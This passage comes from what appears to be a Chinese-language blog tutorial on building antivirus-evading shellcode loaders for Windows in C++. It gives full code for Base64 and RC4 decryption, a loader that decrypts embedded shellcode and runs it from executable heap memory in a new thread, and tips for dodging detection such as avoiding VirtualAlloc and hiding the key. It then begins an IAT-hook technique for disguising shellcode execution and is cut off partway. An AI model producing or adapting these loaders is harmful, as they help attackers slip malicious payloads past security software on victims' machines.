class="number">-1</span>,</span><br><span class="line">    <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>,</span><br><span class="line">    <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>,</span><br><span class="line">    <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>,</span><br><span class="line">    <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>,</span><br><span class="line">    <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>,</span><br><span class="line">    <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>,</span><br><span class="line">    <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>,</span><br><span class="line">    <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief Base64 解码函数（核心）</span></span><br><span class="line"><span class="comment"> * @param encoded Base64 编码字符串</span></span><br><span class="line"><span class="comment"> * @return 解码后的原始数据（vector&lt;uint8_t&gt;）</span></span><br><span class="line"><span class="comment"> * @throw std::invalid_argument 编码字符串非法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">static</span> std::vector&lt;<span class="type">uint8_t</span>&gt; <span class="title">base64Decode</span><span class="params">(<span class="type">const</span> std::string&amp; encoded)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (encoded.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 校验 Base64 字符串长度合法性（必须是 4 的倍数）</span></span><br><span class="line">    <span class="keyword">if</span> (encoded.<span class="built_in">size</span>() % <span class="number">4</span> != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> std::<span class="built_in">invalid_argument</span>(<span class="string">&quot;Base64 解码失败：长度不是 4 的倍数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算填充符 = 的数量</span></span><br><span class="line">    <span class="type">size_t</span> padding = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (encoded.<span class="built_in">back</span>() == <span class="string">&#x27;=&#x27;</span>) &#123;</span><br><span class="line">        padding++;</span><br><span class="line">        <span class="keyword">if</span> (encoded[encoded.<span class="built_in">size</span>() - <span class="number">2</span>] == <span class="string">&#x27;=&#x27;</span>) &#123;</span><br><span class="line">            padding++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::vector&lt;<span class="type">uint8_t</span>&gt; result;</span><br><span class="line">    result.<span class="built_in">reserve</span>(((encoded.<span class="built_in">size</span>() / <span class="number">4</span>) * <span class="number">3</span>) - padding); <span class="comment">// 预分配内存</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; encoded.<span class="built_in">size</span>(); i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="comment">// 解析 4 个 Base64 字符为 3 个字节</span></span><br><span class="line">        <span class="type">uint32_t</span> triple = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">            <span class="type">char</span> c = encoded[i + j];</span><br><span class="line">            <span class="type">int8_t</span> val = base64_decode_table[<span class="built_in">static_cast</span>&lt;<span class="type">uint8_t</span>&gt;(c)];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 非法字符检查</span></span><br><span class="line">            <span class="keyword">if</span> (val == <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> std::<span class="built_in">invalid_argument</span>(<span class="string">&quot;Base64 解码失败：包含非法字符&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 填充符 = 处理为 0</span></span><br><span class="line">            <span class="keyword">if</span> (val == <span class="number">-2</span>) &#123;</span><br><span class="line">                val = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            triple |= (<span class="built_in">static_cast</span>&lt;<span class="type">uint32_t</span>&gt;(val) &lt;&lt; (<span class="number">18</span> - <span class="number">6</span> * j));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 提取 3 个字节</span></span><br><span class="line">        result.<span class="built_in">push_back</span>(<span class="built_in">static_cast</span>&lt;<span class="type">uint8_t</span>&gt;((triple &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>));</span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">2</span> &lt; encoded.<span class="built_in">size</span>() &amp;&amp; encoded[i + <span class="number">2</span>] != <span class="string">&#x27;=&#x27;</span>) &#123;</span><br><span class="line">            result.<span class="built_in">push_back</span>(<span class="built_in">static_cast</span>&lt;<span class="type">uint8_t</span>&gt;((triple &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">3</span> &lt; encoded.<span class="built_in">size</span>() &amp;&amp; encoded[i + <span class="number">3</span>] != <span class="string">&#x27;=&#x27;</span>) &#123;</span><br><span class="line">            result.<span class="built_in">push_back</span>(<span class="built_in">static_cast</span>&lt;<span class="type">uint8_t</span>&gt;(triple &amp; <span class="number">0xFF</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>实现要点</strong>：</p>
<ul>
<li>使用查找表优化解码性能，避免循环查找</li>
<li>严格校验输入合法性，防止异常崩溃</li>
<li>预分配内存，减少动态扩容开销</li>
</ul>
<hr>
<h3 id="rc4-h-RC4-解密实现"><a href="#rc4-h-RC4-解密实现" class="headerlink" title="rc4.h - RC4 解密实现"></a>rc4.h - RC4 解密实现</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span>   <span class="comment">// uint8_t/uint32_t 类型</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span>   <span class="comment">// strlen/memset</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdexcept&gt;</span> <span class="comment">// 异常处理</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RC4 S 盒大小（固定 256 字节）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 256</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 交换两个字节（内部辅助函数）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">swap</span><span class="params">(<span class="type">uint8_t</span>* a, <span class="type">uint8_t</span>* b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a == <span class="literal">nullptr</span> || b == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> std::<span class="built_in">invalid_argument</span>(<span class="string">&quot;swap: 空指针参数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">uint8_t</span> tmp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief RC4 密钥调度算法（KSA - Key Scheduling Algorithm）</span></span><br><span class="line"><span class="comment"> * @param key 加密密钥（const char*）</span></span><br><span class="line"><span class="comment"> * @param S RC4 状态数组（长度必须为 256）</span></span><br><span class="line"><span class="comment"> * @return 0 成功，-1 失败</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">KSA</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* key, <span class="type">uint8_t</span>* S)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 参数校验</span></span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">nullptr</span> || S == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> key_len = <span class="built_in">strlen</span>(key);</span><br><span class="line">    <span class="keyword">if</span> (key_len == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 S 盒</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; ++i) &#123;</span><br><span class="line">        S[i] = <span class="built_in">static_cast</span>&lt;<span class="type">uint8_t</span>&gt;(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 密钥混合</span></span><br><span class="line">    <span class="type">uint32_t</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; ++i) &#123;</span><br><span class="line">        j = (j + S[i] + <span class="built_in">static_cast</span>&lt;<span class="type">uint8_t</span>&gt;(key[i % key_len])) % N;</span><br><span class="line">        <span class="built_in">swap</span>(&amp;S[i], &amp;S[j]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief RC4 伪随机生成算法（PRGA - Pseudo-Random Generation Algorithm）</span></span><br><span class="line"><span class="comment"> * @param S KSA 初始化后的状态数组</span></span><br><span class="line"><span class="comment"> * @param data 待加密/解密的数据（原地操作）</span></span><br><span class="line"><span class="comment"> * @param data_len 数据长度</span></span><br><span class="line"><span class="comment"> * @return 0 成功，-1 失败</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">PRGA</span><span class="params">(<span class="type">uint8_t</span>* S, <span class="type">uint8_t</span>* data, <span class="type">size_t</span> data_len)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 参数校验</span></span><br><span class="line">    <span class="keyword">if</span> (S == <span class="literal">nullptr</span> || data == <span class="literal">nullptr</span> || data_len == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> n = <span class="number">0</span>; n &lt; data_len; ++n) &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % N;</span><br><span class="line">        j = (j + S[i]) % N;</span><br><span class="line">        <span class="built_in">swap</span>(&amp;S[i], &amp;S[j]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成伪随机字节并 XOR（加密/解密核心）</span></span><br><span class="line">        <span class="type">uint8_t</span> rnd = S[(S[i] + S[j]) % N];</span><br><span class="line">        data[n] ^= rnd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 封装的 RC4 加密/解密函数（简化调用）</span></span><br><span class="line"><span class="comment"> * @param key 密钥</span></span><br><span class="line"><span class="comment"> * @param data 待处理数据（原地加密/解密）</span></span><br><span class="line"><span class="comment"> * @param data_len 数据长度</span></span><br><span class="line"><span class="comment"> * @return 0 成功，非 0 失败</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">rc4_crypt</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* key, <span class="type">uint8_t</span>* data, <span class="type">size_t</span> data_len)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint8_t</span> S[N];</span><br><span class="line">    <span class="type">int</span> ret = <span class="built_in">KSA</span>(key, S);</span><br><span class="line">    <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">PRGA</span>(S, data, data_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>RC4 算法特点</strong>：</p>
<ul>
<li>对称加密算法，加密和解密使用相同流程</li>
<li>密钥长度可变（1-256 字节），实战中建议 16-32 字节</li>
<li>速度快，适合大数据量加密</li>
<li>已知安全性较弱，但对抗静态检测足够</li>
</ul>
<hr>
<h2 id="最终加载器实现"><a href="#最终加载器实现" class="headerlink" title="最终加载器实现"></a>最终加载器实现</h2><p>将加密后的 Shellcode 嵌入加载器，运行时动态解密并执行。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;rc4.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;base64.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 加密后的 Shellcode（从 res.txt 复制）</span></span><br><span class="line">    std::string encodedShellcode = &#123;</span><br><span class="line">        <span class="comment">// 这里粘贴加密脚本生成的 C 数组内容</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. Base64 解码</span></span><br><span class="line">    std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt; decodedShellcode = <span class="built_in">base64Decode</span>(encodedShellcode);</span><br><span class="line">    <span class="keyword">if</span> (decodedShellcode.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. RC4 解密（密钥必须与加密脚本一致）</span></span><br><span class="line">    <span class="type">char</span> key[] = <span class="string">&quot;kenny&quot;</span>;</span><br><span class="line">    <span class="type">uint8_t</span> S[N];</span><br><span class="line">    <span class="built_in">memset</span>(S, <span class="number">0</span>, <span class="built_in">sizeof</span>(S));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 RC4 密钥</span></span><br><span class="line">    <span class="type">int</span> ksa_ret = <span class="built_in">KSA</span>(key, S);</span><br><span class="line">    <span class="keyword">if</span> (ksa_ret != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解密 Shellcode</span></span><br><span class="line">    <span class="type">int</span> prga_ret = <span class="built_in">PRGA</span>(</span><br><span class="line">        S,</span><br><span class="line">        decodedShellcode.<span class="built_in">data</span>(),</span><br><span class="line">        decodedShellcode.<span class="built_in">size</span>()</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (prga_ret != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 申请可执行内存（使用堆而非 VirtualAlloc，降低特征）</span></span><br><span class="line">    HANDLE hHeap = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hHeap == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">GetLastError</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PVOID Mptr = <span class="built_in">HeapAlloc</span>(hHeap, HEAP_ZERO_MEMORY, decodedShellcode.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">if</span> (Mptr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">HeapDestroy</span>(hHeap);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">GetLastError</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 复制 Shellcode 到可执行内存</span></span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>(Mptr, decodedShellcode.<span class="built_in">data</span>(), decodedShellcode.<span class="built_in">size</span>());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 创建线程执行 Shellcode</span></span><br><span class="line">    DWORD dwThreadId = <span class="number">0</span>;</span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        (LPTHREAD_START_ROUTINE)Mptr,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        &amp;dwThreadId</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hThread != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">HeapFree</span>(hHeap, <span class="number">0</span>, Mptr);</span><br><span class="line">        <span class="built_in">HeapDestroy</span>(hHeap);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">GetLastError</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 清理资源</span></span><br><span class="line">    <span class="built_in">HeapFree</span>(hHeap, <span class="number">0</span>, Mptr);</span><br><span class="line">    <span class="built_in">HeapDestroy</span>(hHeap);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>免杀优化点</strong>：</p>
<ul>
<li>使用 <code>HeapCreate</code> 代替 <code>VirtualAlloc</code>，降低敏感 API 特征</li>
<li>使用 <code>RtlCopyMemory</code> 代替 <code>memcpy</code>，混淆内存操作</li>
<li>避免使用 <code>PAGE_EXECUTE_READWRITE</code>，可先申请 <code>PAGE_READWRITE</code>，写入后再用 <code>VirtualProtect</code> 改为 <code>PAGE_EXECUTE_READ</code></li>
<li>密钥硬编码可改为动态生成（如基于时间戳、环境变量等）</li>
</ul>
<hr>
<h1 id="方案二：IAT-Hook-隐藏执行"><a href="#方案二：IAT-Hook-隐藏执行" class="headerlink" title="方案二：IAT Hook 隐藏执行"></a>方案二：IAT Hook 隐藏执行</h1><p>通过劫持导入地址表（IAT）中的合法函数，将 Shellcode 执行伪装成正常程序行为，对抗行为检测。</p>
<h2 id="IAT-Hook-原理"><a href="#IAT-Hook-原理" class="headerlink" title="IAT Hook 原理"></a>IAT Hook 原理</h2><p>IAT（Import Address Table）存储了程序运行时需要调用的外部函数地址。通过修改 IAT 中的函数指针，可以将合法函数调用重定向到我们的 Hook 函数，在 Hook 函数中执行 Shellcode。</p>
<p><strong>攻击流程</strong>：</p>
<ol>
<li>程序正常调用 <code>MessageBoxA</code></li>
<li>IAT 中的 <code>MessageBoxA</code> 地址被替换为 <code>hookedMessageBox</code></li>
<li><code>hookedMessageBox</code> 执行 Shellcode</li>
<li>调用原始 <code>MessageBoxA</code>，保持程序正常运行</li>
</ol>
<h2 id="完整实现代码"><a href="#完整实现代码" class="headerlink" title="完整实现代码"></a>完整实现代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 定义 Shellcode（实战中替换为加密后的 Shellcode）</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = &#123;</span><br><span class="line">    <span class="comment">// 这里放置你的 Shellcode</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. Shellcode 加载函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ExecuteShellcode</span><span 